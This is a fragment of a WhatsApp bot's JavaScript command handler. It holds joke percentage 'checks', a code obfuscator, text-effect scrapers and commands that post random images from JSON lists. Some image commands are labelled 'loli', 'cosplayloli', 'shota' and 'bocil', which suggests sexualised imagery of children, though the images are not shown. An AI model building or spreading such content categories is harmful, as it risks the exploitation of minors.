					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
TsunadeBot.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcmznking(`*Please tag someone.*\nFor example: ${prefix + command} @WhatsApp`)
					const mznkingz =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = mznkingz[Math.floor(Math.random() * mznkingz.length)]
					TsunadeBot.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return MznKingGroupReply()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
TsunadeBot.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
TsunadeBot.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
TsunadeBot.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcmznking(`*Please provide a jjavascript code for obfuscate.*\nFor example: ${prefix+command} const mznkingbot = require('baileys')`)
let meg = await obfus(q)
replygcmznking(`*Here is your obfuscated code:*
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcmznking('*Please provide a text.*')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🧚 *${i.name}* : ${i.result}\n\n`
                }
                replygcmznking(teks)
	    }
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replygcmznking(`Example : ${prefix+command} TsunadeBot`) 
await MznKingWaitReply()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
TsunadeBot.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${successReply}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{

if (!q) return replygcmznking(`Example : ${prefix+command} TsunadeBot`) 
await MznKingWaitReply()
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
TsunadeBot.sendMessage(m.chat, { image: { url: dehe }, caption: `${successReply}` }, { quoted: m })
}
break
case 'tiktokgirl':
await MznKingWaitReply()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await MznKingWaitReply()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await MznKingWaitReply()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await MznKingWaitReply()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await MznKingWaitReply()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await MznKingWaitReply()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await MznKingWaitReply()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./HostMedia/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
TsunadeBot.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
TsunadeBot.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await MznKingWaitReply()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcmznking("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                TsunadeBot.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcmznking('What wallpaper do you want?')
await MznKingWaitReply()
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await TsunadeBot.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('${errorReply}')
                })
//TsunadeBot.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

await MznKingWaitReply()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/mikasa.json')
